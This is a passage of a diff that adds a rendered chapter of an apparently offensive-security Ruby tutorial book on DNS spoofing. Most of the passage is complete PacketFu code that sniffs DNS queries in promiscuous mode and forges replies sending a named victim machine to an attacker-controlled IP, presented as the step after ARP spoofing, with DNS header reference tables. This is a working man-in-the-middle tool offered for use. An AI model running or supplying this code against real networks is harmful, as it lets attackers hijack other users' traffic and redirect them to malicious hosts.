+capture = <span class="hljs-constant">Capture</span>.new(<span class="hljs-symbol">:iface</span> =&gt; <span class="hljs-string">&quot;wlan0&quot;</span>,<span class="hljs-symbol">:start</span> =&gt; <span class="hljs-keyword">true</span>, <span class="hljs-symbol">:promisc</span> =&gt; <span class="hljs-keyword">true</span>, <span class="hljs-symbol">:filter</span> =&gt; filter, <span class="hljs-symbol">:save</span> =&gt; <span class="hljs-keyword">true</span>)
+
+<span class="hljs-comment"># * We need to get the queried/requested domain</span>
+<span class="hljs-comment">#    * We need to know the domain length</span>
+<span class="hljs-comment">#    * We need to get the FQDN</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># Convert DNS Payload to readable - Find The FQDN</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readable</span><span class="hljs-params">(raw_domain)</span></span>
+  <span class="hljs-comment"># Prevent processing non domain</span>
+  <span class="hljs-keyword">if</span> raw_domain[<span class="hljs-number">0</span>].ord == <span class="hljs-number">0</span>
+    puts <span class="hljs-string">&quot;ERROR : THE RAW STARTS WITH 0&quot;</span>
+    <span class="hljs-keyword">return</span> raw_domain[<span class="hljs-number">1</span>..-<span class="hljs-number">1</span>]
+  <span class="hljs-keyword">end</span>
+
+  fqdn = <span class="hljs-string">&quot;&quot;</span>
+  length_offset = raw_domain[<span class="hljs-number">0</span>].ord
+  full_length   = raw_domain[ <span class="hljs-number">0</span>..length_offset ].length
+  domain_name   = raw_domain[(full_length - length_offset)..length_offset]
+
+  <span class="hljs-keyword">while</span> length_offset != <span class="hljs-number">0</span>
+    fqdn &lt;&lt; domain_name + <span class="hljs-string">&quot;.&quot;</span>
+    length_offset = raw_domain[full_length].ord
+    domain_name   = raw_domain[full_length + <span class="hljs-number">1</span>..full_length + length_offset]
+    full_length   = raw_domain[<span class="hljs-number">0</span>..full_length + length_offset].length
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-keyword">return</span> fqdn.chomp!(<span class="hljs-string">&apos;.&apos;</span>)
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-comment"># * We need parse/analyze the valid UDP packets only</span>
+<span class="hljs-comment"># * We need to make sure this packet is a DNS query</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># Find the DNS packets</span>
+<span class="hljs-comment">#</span>
+capture.stream.each <span class="hljs-keyword">do</span> |pkt|
+  <span class="hljs-comment"># Make sure we can parse the packet; if we can, parse it</span>
+  <span class="hljs-keyword">if</span> <span class="hljs-constant">UDPPacket</span>.can_parse?(pkt)
+    <span class="hljs-variable">@packet</span> = <span class="hljs-constant">Packet</span>.parse(pkt)
+
+    <span class="hljs-comment"># Make sure we have a query packet</span>
+    dns_query = <span class="hljs-variable">@packet</span>.payload[<span class="hljs-number">2</span>..<span class="hljs-number">3</span>].to_s
+
+    <span class="hljs-keyword">if</span> dns_query == <span class="hljs-string">&quot;\x01\x00&quot;</span>
+      <span class="hljs-comment"># Get the domain name into a readable format</span>
+      domain_name = <span class="hljs-variable">@packet</span>.payload[<span class="hljs-number">12</span>..-<span class="hljs-number">1</span>].to_s <span class="hljs-comment"># FULL QUERY</span>
+      fqdn = readable(domain_name)
+
+      <span class="hljs-comment"># Ignore non query packet</span>
+      <span class="hljs-keyword">next</span> <span class="hljs-keyword">if</span> domain_name.<span class="hljs-keyword">nil</span>?
+
+      puts <span class="hljs-string">&quot;DNS request for: &quot;</span> + fqdn
+    <span class="hljs-keyword">end</span>
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+</code></pre>
+<p>Till now we successfully finished <a href="module_0x3__network_kung_fu/arp_spoofing.md">ARP Spoofing</a> then DNS capturing but still we need to replace/spoof the original response to our domain. e.g. attacker.zone, now we have to build a DNS response instead of spoofed to be sent. So what we need?</p>
+<ul>
+<li>taking the IP we are going to redirect the user to (the spoofing_ip)<ul>
+<li>converting it into hex using the <code>to_i</code> and <code>pack</code> methods.</li>
+</ul>
+</li>
+<li>From there we create a new UDP packet using the data contained in <code>@ourInfo</code> (IP and MAC) and fill in the normal UDP fields.<ul>
+<li>I take most of this information straight from the DNS Query packet.</li>
+</ul>
+</li>
+<li>The next step is to create the DNS Response.<ul>
+<li>the best way to understand the code here is to look at a DNS header and then</li>
+<li>take the bit map of the HEX values and apply them to the header.</li>
+<li>This will let you see what flags are being set.</li>
+</ul>
+</li>
+<li>From here, we just calculate the checksum for the UDP packet and send it out to the target&apos;s machine.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img src="dns_spoofing_Wireshark2.png" alt="Wireshark"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>Figure 2.</strong> DNS Response Payload</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="lang-ruby">
+spoofing_ip = <span class="hljs-string">&quot;69.171.234.21&quot;</span>
+spoofing_ip.split(<span class="hljs-string">&apos;.&apos;</span>).map {|octet| octet.to_i}.pack(<span class="hljs-string">&apos;c*&apos;</span>)
+
+  response = <span class="hljs-constant">UDPPacket</span>.new(<span class="hljs-symbol">:config</span> =&gt; <span class="hljs-constant">PacketFu::Utils</span>.ifconfig(<span class="hljs-string">&quot;wlan0&quot;</span>))
+  response.udp_src   = packet.udp_dst
+  response.udp_dst   = packet.udp_src
+  response.ip_saddr  = packet.ip_daddr
+  response.ip_daddr  = <span class="hljs-string">&quot;192.168.0.21&quot;</span>
+  response.eth_daddr = <span class="hljs-string">&quot;00:0C:29:38:1D:61&quot;</span>
+</code></pre>
+<p>Wrapping up </p>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># -*- coding: binary -*-</span>
+
+<span class="hljs-comment"># Start the capture process</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;packetfu&apos;</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;pp&apos;</span>
+<span class="hljs-keyword">include</span> <span class="hljs-constant">PacketFu</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readable</span><span class="hljs-params">(raw_domain)</span></span>
+
+  <span class="hljs-comment"># Prevent processing non domain</span>
+  <span class="hljs-keyword">if</span> raw_domain[<span class="hljs-number">0</span>].ord == <span class="hljs-number">0</span>
+    puts <span class="hljs-string">&quot;ERROR : THE RAW STARTS WITH 0&quot;</span>
+    <span class="hljs-keyword">return</span> raw_domain[<span class="hljs-number">1</span>..-<span class="hljs-number">1</span>]
+  <span class="hljs-keyword">end</span>
+
+  fqdn = <span class="hljs-string">&quot;&quot;</span>
+  length_offset = raw_domain[<span class="hljs-number">0</span>].ord
+  full_length   = raw_domain[ <span class="hljs-number">0</span>..length_offset ].length
+  domain_name   = raw_domain[(full_length - length_offset)..length_offset]
+
+  <span class="hljs-keyword">while</span> length_offset != <span class="hljs-number">0</span>
+    fqdn &lt;&lt; domain_name + <span class="hljs-string">&quot;.&quot;</span>
+    length_offset = raw_domain[full_length].ord
+    domain_name   = raw_domain[full_length + <span class="hljs-number">1</span> .. full_length + length_offset]
+    full_length   = raw_domain[<span class="hljs-number">0</span> .. full_length + length_offset].length
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-keyword">return</span> fqdn.chomp!(<span class="hljs-string">&apos;.&apos;</span>)
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># Send Response</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof_response</span><span class="hljs-params">(packet, domain)</span></span>
+
+  attackerdomain_name = <span class="hljs-string">&apos;rubyfu.net&apos;</span>
+  attackerdomain_ip   = <span class="hljs-string">&apos;54.243.253.221&apos;</span>.split(<span class="hljs-string">&apos;.&apos;</span>).map {|oct| oct.to_i}.pack(<span class="hljs-string">&apos;c*&apos;</span>)  <span class="hljs-comment"># Spoofing IP</span>
+
+  <span class="hljs-comment"># Build UDP packet</span>
+  response = <span class="hljs-constant">UDPPacket</span>.new(<span class="hljs-symbol">:config</span> =&gt; <span class="hljs-constant">PacketFu::Utils</span>.ifconfig(<span class="hljs-string">&quot;wlan0&quot;</span>))
+  response.udp_src   = packet.udp_dst             <span class="hljs-comment"># source port</span>
+  response.udp_dst   = packet.udp_src             <span class="hljs-comment"># destination port</span>
+  response.ip_saddr  = packet.ip_daddr            <span class="hljs-comment"># modem&apos;s IP address to be source</span>
+  response.ip_daddr  = packet.ip_saddr            <span class="hljs-comment"># victim&apos;s IP address to be destination</span>
+  response.eth_daddr = packet.eth_saddr           <span class="hljs-comment"># the victim&apos;s MAC address</span>
+  response.payload   = packet.payload[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]        <span class="hljs-comment"># Transaction ID</span>
+  response.payload  += <span class="hljs-string">&quot;\x81\x80&quot;</span>                 <span class="hljs-comment"># Flags: Reply code: No error (0)</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x01&quot;</span>                 <span class="hljs-comment"># Question: 1</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x00&quot;</span>                 <span class="hljs-comment"># Answer RRs: 0</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x00&quot;</span>                 <span class="hljs-comment"># Authority RRs: 0</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x00&quot;</span>                 <span class="hljs-comment"># Additional RRs: 0</span>
+  response.payload  += attackerdomain_name.split(<span class="hljs-string">&apos;.&apos;</span>).map <span class="hljs-keyword">do</span> |section| <span class="hljs-comment"># Queries | Name: , Convert domain to DNS style(the opposite of readable method)</span>
+    [section.size.chr, section.chars.map {|c| <span class="hljs-string">&apos;\x%x&apos;</span> % c.ord}.join]
+  <span class="hljs-keyword">end</span>.join + <span class="hljs-string">&quot;\x00&quot;</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x01&quot;</span>                 <span class="hljs-comment"># Queries | Type: A (Host address)</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x01&quot;</span>                 <span class="hljs-comment"># Queries | Class: IN (0x0001)</span>
+  response.payload  += <span class="hljs-string">&quot;\xc0\x0c&quot;</span>                 <span class="hljs-comment"># Answer | Name: twitter.com</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x01&quot;</span>                 <span class="hljs-comment"># Answer | Type: A (Host address)</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x01&quot;</span>                 <span class="hljs-comment"># Answer | Class: IN (0x0001)</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x00\x00\x25&quot;</span>         <span class="hljs-comment"># Answer | Time to live: 37 seconds</span>
+  response.payload  += <span class="hljs-string">&quot;\x00\x04&quot;</span>                 <span class="hljs-comment"># Answer | Data length: 4</span>
+  response.payload  += attackerdomain_ip          <span class="hljs-comment"># Answer | Addr</span>
+  response.recalc                                 <span class="hljs-comment"># Calculate the packet</span>
+  response.to_w(response.iface)                   <span class="hljs-comment"># Send the packet through our interface</span>
+<span class="hljs-keyword">end</span>
+
+filter = <span class="hljs-string">&quot;udp and port 53 and host &quot;</span> + <span class="hljs-string">&quot;192.168.0.21&quot;</span>
+<span class="hljs-variable">@capture</span> = <span class="hljs-constant">Capture</span>.new(<span class="hljs-symbol">:iface</span> =&gt; <span class="hljs-string">&quot;wlan0&quot;</span>, <span class="hljs-symbol">:start</span> =&gt; <span class="hljs-keyword">true</span>, <span class="hljs-symbol">:promisc</span> =&gt; <span class="hljs-keyword">true</span>, <span class="hljs-symbol">:filter</span> =&gt; filter, <span class="hljs-symbol">:save</span> =&gt; <span class="hljs-keyword">true</span>)
+<span class="hljs-comment"># Find the DNS packets</span>
+<span class="hljs-variable">@capture</span>.stream.each <span class="hljs-keyword">do</span> |pkt|
+  <span class="hljs-comment"># Make sure we can parse the packet; if we can, parse it</span>
+  <span class="hljs-keyword">if</span> <span class="hljs-constant">UDPPacket</span>.can_parse?(pkt)
+    packet = <span class="hljs-constant">Packet</span>.parse(pkt)
+
+    <span class="hljs-comment"># Get the offset of the query type: (request=\x01\x00, response=\x81\x80)</span>
+    dns_query = packet.payload[<span class="hljs-number">2</span>..<span class="hljs-number">3</span>].to_s
+
+    <span class="hljs-comment"># Make sure we have a dns query packet</span>
+    <span class="hljs-keyword">if</span> dns_query == <span class="hljs-string">&quot;\x01\x00&quot;</span>
+      <span class="hljs-comment"># Get the domain name into a readable format</span>
+      domain_name = packet.payload[<span class="hljs-number">12</span>..-<span class="hljs-number">1</span>].to_s <span class="hljs-comment"># FULL DOMAIN</span>
+      fqdn = readable(domain_name)
+      <span class="hljs-comment"># Ignore non query packet</span>
+      <span class="hljs-keyword">next</span> <span class="hljs-keyword">if</span> domain_name.<span class="hljs-keyword">nil</span>?
+      puts <span class="hljs-string">&quot;DNS request for: &quot;</span> + fqdn
+
+    <span class="hljs-keyword">end</span>
+    <span class="hljs-comment"># Make sure we have a dns reply packet</span>
+    <span class="hljs-keyword">if</span> dns_query == <span class="hljs-string">&quot;\x81\x80&quot;</span>
+      domain_name = packet.payload[<span class="hljs-number">12</span>..-<span class="hljs-number">1</span>].to_s <span class="hljs-comment"># FULL DOMAIN</span>
+      fqdn = readable(domain_name)
+      puts <span class="hljs-string">&quot;[*] Start Spoofing: &quot;</span> + fqdn
+      spoof_response packet, domain_name
+    <span class="hljs-keyword">end</span>
+
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+</code></pre>
+<p><a href="https://github.com/SilverFoxx/Spoofa/blob/master/spoofa" target="_blank">https://github.com/SilverFoxx/Spoofa/blob/master/spoofa</a></p>
+<p>Sources<sup><a href="#fn_1" id="reffn_1">1</a></sup> <sup><a href="#fn_2" id="reffn_2">2</a></sup> - The code has been modified and fixed</p>
+<h2 id=""><a name="" class="plugin-anchor" href="#"><span class="fa fa-link"></span></a><br><br><br></h2>
+<blockquote id="fn_1">
+<sup>1</sup>. <a href="http://crushbeercrushcode.org/2012/10/ruby-dns-spoofing-using-packetfu/" target="_blank">DNS Spoofing Using PacketFu</a><a href="#reffn_1" title="Jump back to footnote [1] in the text."> &#x21A9;</a>
+</blockquote>
+<blockquote id="fn_2">
+<sup>2</sup>. <a href="http://tuftsdev.github.io/DefenseOfTheDarkArts/assignments/manipulatingthenetworkwithpacketfu-110314111058-phpapp01.pdf" target="_blank">Manipulating The Network with PacketFu</a><a href="#reffn_2" title="Jump back to footnote [2] in the text."> &#x21A9;</a>
+</blockquote>
+<blockquote id="fn_3">
+<sup>3</sup>. <a href="http://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-12" target="_blank">DNS Header Flags</a><a href="#reffn_3" title="Jump back to footnote [3] in the text."> &#x21A9;</a>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Bit</th>
+<th>Flag</th>
+<th>Description</th>
+<th>Reference</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">bit 5</td>
+<td>AA</td>
+<td>Authoritative Answer</td>
+<td>[RFC1035]</td>
+</tr>
+<tr>
+<td style="text-align:center">bit 6</td>
+<td>TC</td>
+<td>Truncated Response</td>
+<td>[RFC1035]</td>
+</tr>
+<tr>
+<td style="text-align:center">bit 7</td>
+<td>RD</td>
+<td>Recursion Desired</td>
+<td>[RFC1035]</td>
+</tr>
+<tr>
+<td style="text-align:center">bit 8</td>
+<td>RA</td>
+<td>Recursion Allowed</td>
+<td>[RFC1035]</td>
+</tr>
+<tr>
+<td style="text-align:center">bit 9</td>
+<td></td>
+<td>Reserved</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">bit 10</td>
+<td>AD</td>
+<td>Authentic Data</td>
+<td>[RFC4035]</td>
+</tr>
+<tr>
+<td style="text-align:center">bit 11</td>
+<td>CD</td>
+<td>Checking Disabled</td>
+<td>[RFC4035]</td>
+</tr>
+</tbody>
+</table>
+<blockquote id="fn_4">
+<sup>4</sup>. <a href="http://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-4" target="_blank">DNS Lookups Types</a><a href="#reffn_4" title="Jump back to footnote [4] in the text."> &#x21A9;</a>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Type</th>
+<th style="text-align:center">Value</th>
+<th style="text-align:center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">A</td>
+<td style="text-align:center">1</td>
+<td style="text-align:center">IP Address</td>
+</tr>
+<tr>
+<td style="text-align:center">NS</td>
+<td style="text-align:center">2</td>
+<td style="text-align:center">Name Server</td>
+</tr>
+<tr>
+<td style="text-align:center">CNAME</td>
+<td style="text-align:center">5</td>
+<td style="text-align:center">Alias of a domain name</td>
+</tr>
+<tr>
+<td style="text-align:center">PTR</td>
+<td style="text-align:center">12</td>
+<td style="text-align:center">Reverse DNS Lookup using the IP Address</td>
+</tr>
+<tr>
+<td style="text-align:center">HINFO</td>
+<td style="text-align:center">13</td>
+<td style="text-align:center">Host Information</td>
+</tr>
+<tr>
+<td style="text-align:center">MX</td>
+<td style="text-align:center">15</td>
+<td style="text-align:center">MX Record</td>
+</tr>
+<tr>
+<td style="text-align:center">AXFR</td>
+<td style="text-align:center">252</td>
+<td style="text-align:center">Request for Zone Transfer</td>
+</tr>
+<tr>
+<td style="text-align:center">ANY</td>
+<td style="text-align:center">255</td>
+<td style="text-align:center">Request for All Records</td>
+</tr>
+</tbody>
+</table>
+
+                    
+                    </section>
+                
+                
+                </div>
+            </div>
+        </div>
+
+        
+        <a href="../module_0x3__network_kung_fu/arp_spoofing.html" class="navigation navigation-prev " aria-label="Previous page: ARP Spoofing"><i class="fa fa-angle-left"></i></a>
+        
+        
+        <a href="../module_0x4__web_kung_fu/index.html" class="navigation navigation-next " aria-label="Next page: Module 0x4 | Web Kung Fu"><i class="fa fa-angle-right"></i></a>
+        
+    </div>
+</div>
+
+        
+<script src="../gitbook/app.js"></script>
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-splitter/splitter.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-book-summary-scroll-position-saver/book-summary-scroll-position-saver.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-search/lunr.min.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-search/search.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-sharing/buttons.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-fontsettings/buttons.js"></script>
+    
+
+<script>
+require(["gitbook"], function(gitbook) {
+    var config = {"addcssjs":{"js":["styles/header.js"]},"anchors":{},"todo":{},"splitter":{},"book-summary-scroll-position-saver":{},"expandable-chapters":{},"highlight":{},"search":{"maxIndexSize":1000000},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2}};
+    gitbook.start(config);
+});
+</script>
+
+        
+    </body>
+    
+</html>
